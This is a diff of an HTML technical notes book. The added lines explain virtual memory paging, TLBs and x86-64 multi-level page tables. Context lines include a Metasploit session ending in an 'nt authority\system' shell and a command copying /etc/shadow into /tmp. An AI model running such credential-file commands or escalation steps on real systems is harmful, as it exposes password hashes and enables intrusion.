+<p>When the CPU accesses a virtual address, the MMU (Memory Management Unit) performs the following steps:</p>
+<pre><code>Step 1: Split the virtual address
++------------------+----------------+
+|   VPN            |   Offset       |
++------------------+----------------+
+
+Step 2: Use VPN to index into the page table
++------------------+      +---------------------+
+|   VPN            | ---&gt; | Page Table Entry    |
++------------------+      | (contains PFN +     |
+                          |  valid/dirty/prot   |
+                          |  flags)             |
+                          +---------------------+
+
+Step 3: Combine PFN with original offset
++------------------+----------------+
+|   PFN            |   Offset       |  &lt;-- Physical Address
++------------------+----------------+
+</code></pre>
+<ul>
+<li>The <strong>offset is never translated</strong> — it passes through unchanged. Only the VPN is replaced by the PFN.</li>
+<li>If the page table entry’s <strong>valid bit</strong> is 0, the page is not in physical memory and a <strong>page fault</strong> is triggered — the OS loads the page from disk and retries.</li>
+</ul>
+<h3 id="concrete-example"><a class="header" href="#concrete-example">Concrete Example</a></h3>
+<p>Assume:</p>
+<ul>
+<li>16-bit virtual address space</li>
+<li>Page size: 256 bytes → offset = 8 bits (2^8 = 256)</li>
+<li>VPN = upper 8 bits</li>
+</ul>
+<pre><code>Virtual address: 0x026C  =  0000 0010 0110 1100
+
+Split:
++----------+----------+
+|  VPN     |  Offset  |
+|  0x02    |  0x6C    |
+| (page 2) | (byte 108)|
++----------+----------+
+
+Page table lookup (VPN 0x02):
++---------+-------------------+
+| VPN     | PFN               |
++---------+-------------------+
+|  0x00   | 0x05              |
+|  0x01   | 0x08              |
+|  0x02   | 0x03  &lt;-- match   |
+|  0x03   | 0x07              |
++---------+-------------------+
+
+Physical address = PFN 0x03 + offset 0x6C:
++----------+----------+
+|  PFN     |  Offset  |
+|  0x03    |  0x6C    |
++----------+----------+
+= 0x036C
+</code></pre>
+<h3 id="page-table-entry-pte-flags"><a class="header" href="#page-table-entry-pte-flags">Page Table Entry (PTE) Flags</a></h3>
+<p>Each entry in the page table stores more than just the PFN — it also carries protection and status bits:</p>
+<pre><code>+-----+-----+-----+-----+-----+-------- PFN --------+
+|  V  |  R  |  W  |  X  |  D  |   Physical Frame #  |
++-----+-----+-----+-----+-----+--------------------+
+  ^     ^     ^     ^     ^
+  |     |     |     |     Dirty: page has been written to
+  |     |     |     Execute: page can be executed
+  |     |     Write: page can be written
+  |     Read: page can be read
+  Valid: page is present in physical memory (0 = page fault)
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Name</th><th>Meaning</th></tr>
+</thead>
+<tbody>
+<tr><td>V</td><td>Valid</td><td>1 = page is in physical memory; 0 = triggers page fault</td></tr>
+<tr><td>R</td><td>Read</td><td>Page is readable</td></tr>
+<tr><td>W</td><td>Write</td><td>Page is writable</td></tr>
+<tr><td>X</td><td>Execute</td><td>Page is executable (NX bit when cleared = no-execute)</td></tr>
+<tr><td>D</td><td>Dirty</td><td>Page has been modified since last written to disk</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="the-translation-lookaside-buffer-tlb"><a class="header" href="#the-translation-lookaside-buffer-tlb">The Translation Lookaside Buffer (TLB)</a></h3>
+<ul>
+<li>Looking up the page table on every memory access would require an additional memory read, doubling the cost of every instruction.</li>
+<li>The CPU caches recent VPN→PFN translations in a small, fast hardware structure called the <strong>TLB</strong> (Translation Lookaside Buffer).</li>
+<li>On each memory access the MMU checks the TLB first:</li>
+</ul>
+<pre><code>CPU issues virtual address
+         |
+         v
+   +------------+     hit     +----------------------+
+   |    TLB     | ----------&gt; | Use cached PFN       |
+   +------------+             +----------------------+
+         |
+       miss
+         |
+         v
+   +------------+
+   | Page Table | (walks the page table in memory)
+   | Walk       |
+   +------------+
+         |
+         v
+   +------------------+
+   | Load entry into  |
+   | TLB, retry       |
+   +------------------+
+</code></pre>
+<ul>
+<li>A <strong>TLB hit</strong> resolves the address in ~1 cycle. A <strong>TLB miss</strong> takes tens to hundreds of cycles (memory access to walk the page table).</li>
+<li>Context switches (switching between processes) require either <strong>flushing</strong> the TLB or tagging entries with an <strong>ASID</strong> (Address Space Identifier) so entries from different processes can coexist.</li>
+</ul>
+<h3 id="page-table-structure"><a class="header" href="#page-table-structure">Page Table Structure</a></h3>
+<h4 id="linear-single-level-page-table"><a class="header" href="#linear-single-level-page-table">Linear (Single-Level) Page Table</a></h4>
+<ul>
+<li>The simplest form: a flat array stored in memory, indexed directly by the VPN.</li>
+<li>Entry <code>i</code> in the array is the PTE for virtual page <code>i</code>.</li>
+<li>The OS stores the base address of this array in a register (e.g., <code>CR3</code> on x86).</li>
+</ul>
+<pre><code>VPN 0  +------------------+
+       | PTE 0 (PFN + flags)|
+VPN 1  +------------------+
+       | PTE 1 (PFN + flags)|
+VPN 2  +------------------+
+       | PTE 2 (PFN + flags)|
+  ...  +------------------+
+VPN N  | PTE N (PFN + flags)|
+       +------------------+
+</code></pre>
+<p><strong>The size problem:</strong></p>
+<ul>
+<li>32-bit address space, 4 KB pages → 2^20 = 1,048,576 entries</li>
+<li>Each PTE is 4 bytes → <strong>4 MB per process</strong>, just for the page table</li>
+<li>With 100 running processes → 400 MB of memory consumed by page tables alone</li>
+<li>A 64-bit address space makes this completely impractical</li>
+</ul>
+<h4 id="multi-level-page-tables"><a class="header" href="#multi-level-page-tables">Multi-Level Page Tables</a></h4>
+<ul>
+<li>Rather than one large flat array, split the VPN into multiple parts and build a tree of page tables.</li>
+<li>Only allocate inner table nodes for regions of the address space actually in use — large unmapped gaps consume no memory.</li>
+<li>Each level of the tree is itself a page-sized table (fits in one 4 KB page).</li>
+</ul>
+<p><strong>Two-level example (x86 32-bit, 10|10|12 split):</strong></p>
+<pre><code>Virtual address (32 bits):
++----------+----------+--------------+
+|  VPN1    |  VPN2    |   Offset     |
+| 10 bits  | 10 bits  |   12 bits    |
++----------+----------+--------------+
+     |           |
+     |           +-------&gt; indexes into a second-level page table
+     +-----------------&gt; indexes into the Page Directory
+</code></pre>
+<p>The walk:</p>
+<pre><code>CR3 register
+     |
+     v
++--------------------+         (Page Directory — 1024 entries)
+| PDE 0              |
+| PDE 1              |
+| ...                |
+| PDE[VPN1] ------+  |
+| ...             |  |
++--------------------+
+                  |
+                  v
+         +--------------------+   (Second-level Page Table — 1024 entries)
+         | PTE 0              |
+         | PTE 1              |
+         | ...                |
+         | PTE[VPN2] ---+     |
+         | ...          |     |
+         +--------------------+
+                        |
+                        v
+                  +----------+----------+
+                  |   PFN    |  Offset  |  &lt;-- Physical Address
+                  +----------+----------+
+</code></pre>
+<ul>
+<li>If <code>PDE[VPN1]</code> is not valid, the entire second-level table for that region is not allocated — saving 4 MB for every 4 MB gap in the address space.</li>
+<li>A process with a small code segment and a small heap/stack needs only a handful of second-level tables, regardless of the total address space size.</li>
+</ul>
+<p><strong>Three-level and four-level tables</strong> extend this pattern for larger address spaces. Each additional level adds 9 bits of VPN indexing in exchange for one more memory access during a TLB miss.</p>
+<h4 id="x86-64-four-level-page-table-999912"><a class="header" href="#x86-64-four-level-page-table-999912">x86-64 Four-Level Page Table (9|9|9|9|12)</a></h4>
+<p>x86-64 uses a 48-bit virtual address split into four 9-bit VPN fields plus a 12-bit offset:</p>
+<pre><code>Virtual address (48 bits used):
++-------+-------+-------+-------+--------------+
+|  PGD  |  PUD  |  PMD  |  PTE  |   Offset     |
+| 9 bits| 9 bits| 9 bits| 9 bits|   12 bits    |
++-------+-------+-------+-------+--------------+
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Level</th><th>Linux name</th><th>x86 name</th><th>Indexes</th></tr>
+</thead>
+<tbody>
+<tr><td>1</td><td>PGD (Page Global Directory)</td><td>PML4</td><td>bits 47–39</td></tr>
+<tr><td>2</td><td>PUD (Page Upper Directory)</td><td>PDPT</td><td>bits 38–30</td></tr>
+<tr><td>3</td><td>PMD (Page Middle Directory)</td><td>PD</td><td>bits 29–21</td></tr>
+<tr><td>4</td><td>PTE (Page Table Entry)</td><td>PT</td><td>bits 20–12</td></tr>
+<tr><td>—</td><td>Offset</td><td>—</td><td>bits 11–0</td></tr>
+</tbody>
+</table>
+</div>
+<p>The four-level walk (four memory accesses on a TLB miss):</p>
+<pre><code>CR3
+ |
+ v
++-------+    +-------+    +-------+    +-------+    +---------+
+|  PGD  | -&gt; |  PUD  | -&gt; |  PMD  | -&gt; |  PTE  | -&gt; | PFN +   |
+| [idx] |    | [idx] |    | [idx] |    | [idx] |    | Offset  |
++-------+    +-------+    +-------+    +-------+    +---------+
+  ^             ^             ^             ^
+  bits 47-39    bits 38-30    bits 29-21    bits 20-12
+</code></pre>
+<ul>
+<li>Each table fits in exactly one 4 KB page (512 entries × 8 bytes = 4096 bytes).</li>
+<li>An entire 512 GB region of virtual address space can be left unallocated by having one null PGD entry — zero memory consumed.</li>
+<li>Linux 5.4+ supports a <strong>five-level</strong> page table (57-bit virtual addresses) for systems needing more than 128 TB of virtual address space per process.</li>
+</ul>
+<h4 id="page-table-size-comparison"><a class="header" href="#page-table-size-comparison">Page Table Size Comparison</a></h4>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Architecture</th><th>Levels</th><th>VPN split</th><th>Max virtual space</th><th>Table walk cost</th></tr>
+</thead>
+<tbody>
+<tr><td>x86 32-bit</td><td>2</td><td>10|10|12</td><td>4 GB</td><td>2 memory reads</td></tr>
+<tr><td>x86-64</td><td>4</td><td>9|9|9|9|12</td><td>128 TB</td><td>4 memory reads</td></tr>
+<tr><td>x86-64 (5-level)</td><td>5</td><td>9|9|9|9|9|12</td><td>128 PB</td><td>5 memory reads</td></tr>
+</tbody>
+</table>
+</div>
+<p>Each level adds one memory access on a TLB miss — the TLB exists precisely to amortize this cost. With a warm TLB, the number of levels has no runtime impact.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="network-manager"><a class="header" href="#network-manager">network manager</a></h1>
 <ul>
@@ -44299,7 +45765,7 @@ As stated above, most processes have the same EUID and RUID. As a result, the de
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="bash-1"><a class="header" href="#bash-1">Bash</a></h1>
-<h2 id="directory-map-41"><a class="header" href="#directory-map-41">Directory Map</a></h2>
+<h2 id="directory-map-42"><a class="header" href="#directory-map-42">Directory Map</a></h2>
 <ul>
 <li><a href="#bash-notes">bash_notes</a></li>
 <li><a href="#moving-the-cursor-1">keyboard_shortcuts</a></li>
@@ -44574,7 +46040,7 @@ similarly Ctrl+v ENTER will display the escape sequence for the Enter key: ^M
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="commands-4"><a class="header" href="#commands-4">Commands</a></h1>
-<h2 id="directory-map-42"><a class="header" href="#directory-map-42">Directory Map</a></h2>
+<h2 id="directory-map-43"><a class="header" href="#directory-map-43">Directory Map</a></h2>
 <ul>
 <li><a href="#chgrp">chgrp</a></li>
 <li><a href="#chmod">chmod</a></li>
@@ -44766,7 +46232,7 @@ PID        TTY     STAT   TIME          CMD
 <p>See page 37</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="greybeard-qualification-1"><a class="header" href="#greybeard-qualification-1">Greybeard Qualification</a></h1>
-<h2 id="directory-map-43"><a class="header" href="#directory-map-43">Directory Map</a></h2>
+<h2 id="directory-map-44"><a class="header" href="#directory-map-44">Directory Map</a></h2>
 <ul>
 <li><a href="#block-devices-and-file-systems">block_dev_and_file_systems</a></li>
 <li><a href="#memory-management-1">memory_management</a></li>
@@ -45779,7 +47245,7 @@ cpu_slabs                 objects                   partial                   sa
 These settings are configurable via <code>sysctl</code></p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="tools-4"><a class="header" href="#tools-4">Tools</a></h1>
-<h2 id="directory-map-44"><a class="header" href="#directory-map-44">Directory Map</a></h2>
+<h2 id="directory-map-45"><a class="header" href="#directory-map-45">Directory Map</a></h2>
 <ul>
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
@@ -47875,7 +49341,7 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 </code></pre>
 <hr>
-<h2 id="key-takeaways-10"><a class="header" href="#key-takeaways-10">Key Takeaways</a></h2>
+<h2 id="key-takeaways-11"><a class="header" href="#key-takeaways-11">Key Takeaways</a></h2>
 <ol>
 <li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
 <li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
@@ -49885,7 +51351,7 @@ sudo cp /etc/shadow /tmp/shadow.bak
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-4"><a class="header" href="#troubleshooting-4">Troubleshooting</a></h1>
-<h2 id="directory-map-45"><a class="header" href="#directory-map-45">Directory Map</a></h2>
+<h2 id="directory-map-46"><a class="header" href="#directory-map-46">Directory Map</a></h2>
 <ul>
 <li><a href="troubleshooting/linux">linux</a></li>
 <li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
@@ -49940,7 +51406,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="linux-1"><a class="header" href="#linux-1">Linux</a></h1>
-<h2 id="directory-map-46"><a class="header" href="#directory-map-46">Directory Map</a></h2>
+<h2 id="directory-map-47"><a class="header" href="#directory-map-47">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-memory">memory</a></li>
 </ul>
@@ -49996,7 +51462,7 @@ az aks nodepool update –resource-group rc-02us1-kubernetes-01-rg –cluster-na
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
-<h2 id="directory-map-47"><a class="header" href="#directory-map-47">Directory Map</a></h2>
+<h2 id="directory-map-48"><a class="header" href="#directory-map-48">Directory Map</a></h2>
 <ul>
 <li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
 <li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
@@ -50110,7 +51576,7 @@ KubePodInventory
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When…</a></h1>
-<h2 id="directory-map-48"><a class="header" href="#directory-map-48">Directory Map</a></h2>
+<h2 id="directory-map-49"><a class="header" href="#directory-map-49">Directory Map</a></h2>
 <ul>
 <li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
 </ul>
